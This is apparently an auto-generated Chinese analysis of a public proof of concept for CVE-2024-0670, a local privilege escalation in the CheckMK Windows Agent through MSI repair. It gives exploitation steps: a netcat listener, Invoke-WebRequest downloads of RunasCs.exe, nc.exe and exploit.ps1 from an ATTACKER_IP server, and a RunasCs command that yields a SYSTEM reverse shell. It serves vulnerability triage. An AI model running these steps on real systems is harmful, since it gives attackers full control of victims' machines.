## CVE-2024-0670 - CheckMK Windows Agent Local Privilege Escalation

**漏洞编号:** CVE-2024-0670

**漏洞类型:** Local Privilege Escalation

**影响应用:** CheckMK Windows Agent

**危害等级:** High

**CVSS评分:** Not provided

**影响版本:** CheckMK Windows Agent (specific versions affected by writable temporary file paths during MSI repair are not detailed in the provided PoC, but typically apply to all affected builds prior to patch)

**利用条件:** Requires a low-privileged Windows user on the target machine, PowerShell enabled, an installed CheckMK Windows Agent, and the ability for the target machine to download files from an attacker-controlled HTTP server.

**POC 可用性:** 9/10

**POC 类型:** Complete exploitation

**攻击复杂度:** Medium

**投毒风险:** 10%

## 详情

详细描述：

**POC有效性分析**
CVE-2024-0670 是一个存在于 CheckMK Windows Agent 中的本地权限提升（Local Privilege Escalation, LPE）漏洞。该漏洞的根源在于CheckMK Agent在执行MSI（Microsoft Installer）修复操作时，会从对低权限用户可写的临时目录，即 `C:\Windows\Temp\`，执行文件。攻击者可以利用这一特性，通过在预期的临时文件路径放置恶意可执行文件，并在适当的时机触发MSI修复过程，从而以 `NT AUTHORITY\SYSTEM` 的最高权限执行任意代码。

提供的PoC代码和说明展示了一个完整且高度有效的利用链。PoC的核心思想是预先将恶意载荷（包括一个自定义的`runas`替代工具`RunasCs.exe`、Netcat `nc.exe` 和一个PowerShell利用脚本`exploit.ps1`）部署到目标系统的`C:\Windows\Temp\`目录。当MSI修复被触发后，CheckMK Agent会尝试以SYSTEM权限执行这些预先放置的文件。`RunasCs.cs`的源代码分析显示，它是一个功能健全的C#程序，旨在允许用户以指定凭据运行命令，并在利用的最后阶段，通过SYSTEM权限执行`exploit.ps1`脚本，从而获取一个SYSTEM权限的反向Shell。PoC的README文档清晰地概述了攻击步骤、所需工具和环境配置，使得复现过程相对直接。整体而言，该PoC设计完善，利用逻辑清晰，其提供的利用方法在技术上是可靠的，能够从一个低权限用户成功提升到系统级权限，对受影响系统构成高风险威胁。

**利用步骤**
1.  **准备攻击者环境：** 在攻击者机器上（例如Linux或Windows），确保安装了Python（用于搭建简单的HTTP服务器）和Netcat（用于监听反向Shell）。
2.  **托管利用工具：** 将PoC提供的 `RunasCs.exe`、`nc.exe` 和 `exploit.ps1` 文件放置在一个易于访问的目录中。在该目录中，启动一个HTTP服务器，例如使用 `python3 -m http.server 8000`。
3.  **启动Netcat监听：** 在攻击者机器上，启动一个Netcat监听器，例如执行 `nc -lvnp 1111`，等待目标系统发回的反向Shell连接。
4.  **目标系统下载工具：** 在目标Windows机器上，以低权限用户身份，通过PowerShell下载攻击者托管的利用工具到 `C:\Windows\Temp\` 目录。具体命令可能包括：
    `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"`
    `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"`
    `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"`
5.  **执行漏洞利用：** 在目标机器上，使用`RunasCs.exe`（或直接通过PowerShell触发）执行已下载的`exploit.ps1`脚本，该脚本将触发CheckMK Agent的MSI修复过程，并利用漏洞以SYSTEM权限执行预设的恶意代码，例如：
    `.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"`
6.  **获取SYSTEM Shell：** 如果攻击成功，攻击者的Netcat监听器将收到来自目标系统的 `NT AUTHORITY\SYSTEM` 权限的反向Shell连接。

**投毒风险分析**
对该PoC的投毒风险评估为低（10%）。主要基于以下几点考量：

1.  **代码透明度高：** `RunasCs.cs` 提供了C#源代码，代码逻辑清晰，其功能是实现带有凭据的进程执行，没有发现明显的代码混淆、加密或执行异常外部命令的行为。它完全符合其作为 `runas` 替代品的描述。
2.  **依赖项由用户控制：** PoC明确指示用户自行在攻击者机器上托管所有必要的利用文件（`RunasCs.exe`、`nc.exe`和`exploit.ps1`）。这意味着使用者对这些文件的内容具有完全的控制权和可见性。在运行之前，使用者可以对其进行审查、哈希校验或动态分析，以确保其不包含额外的恶意载荷。
3.  **无内置恶意载荷：** PoC的目的是演示LPE漏洞，并最终通过Netcat提供一个反向Shell。Netcat作为一个常用的网络工具，在此处被用作获取Shell的载荷，是漏洞利用的预期结果，而非PoC自身携带的“投毒”行为。PoC本身不包含隐藏的、超出其声明功能的恶意代码。
4.  **无不可控外部请求：** PoC的执行过程不涉及从第三方不可信的URL下载或执行其他脚本或二进制文件，所有所需文件均由攻击者自行提供。

尽管风险较低，但为了确保安全，强烈建议使用者在实际复现或测试此PoC之前，对完整版的`exploit.ps1`脚本以及二进制文件`RunasCs.exe`和`nc.exe`（如果不是自行编译或从官方可信源获取）进行严格的安全审计和分析。这包括检查文件哈希值、代码审查以及在隔离环境中进行动态行为分析，以防止任何未经授权的篡改或潜在的恶意行为。

**项目地址:** Not provided in input data

**漏洞详情:** https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/
